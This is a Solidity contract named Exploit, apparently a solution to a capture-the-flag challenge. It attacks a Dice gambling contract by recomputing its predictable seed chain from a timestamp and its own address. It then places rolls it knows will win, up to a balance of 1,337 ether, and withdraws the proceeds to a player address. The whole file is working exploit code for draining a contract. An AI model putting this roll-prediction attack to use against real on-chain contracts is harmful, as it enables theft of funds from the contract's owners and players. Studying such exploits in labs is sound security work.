// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "./Dice.sol";

contract Exploit {
    Dice public dice;
    address public player;

    event logTimestamp(uint256 timestamp);

    constructor(address _dice, address _player) {
        dice = Dice(payable(_dice));
        player = _player;
    }

    function initialSeed(uint256 offset, uint256 _timestamp) public view returns (bytes32) {
        return keccak256(abi.encodePacked(_timestamp + offset, address(this)));
    }

    function attack() external {
        dice.startGame();
    }

    function exploit(uint256 _block, uint256 _timestamp) public {
        bytes32 clientSeed = initialSeed(_block, _timestamp);
        bytes32[] memory serverSeedChain = new bytes32[](128);
        serverSeedChain[0] =
            keccak256(abi.encodePacked(initialSeed(_block + 1, _timestamp)));

        for (uint32 i = 1; i < 128; i++) {
            serverSeedChain[i] = keccak256(abi.encodePacked(serverSeedChain[i - 1]));
        }

        for (uint32 i = 128 - 1; i > 0; i--) {
            bytes32 gameHash = dice.getGameHash(serverSeedChain[i], clientSeed);
            uint256 roll = dice.getRoll(gameHash);

            // RIP
            if (address(this).balance <= 0) {
                break;
            }

            uint256 wager = address(this).balance > 100 ether
                ? 100 ether 
                : 12 ether;
            uint16 rollOver = uint16(roll - 1 == 0 ? 1 : roll - 1);

            dice.rollDice{value: wager}(rollOver);

            if (address(this).balance > 1_337 ether) {
                break;
            }
        }
    }

    function withdraw() external {
        payable(player).transfer(address(this).balance);
    }
    
    receive() external payable {}
}
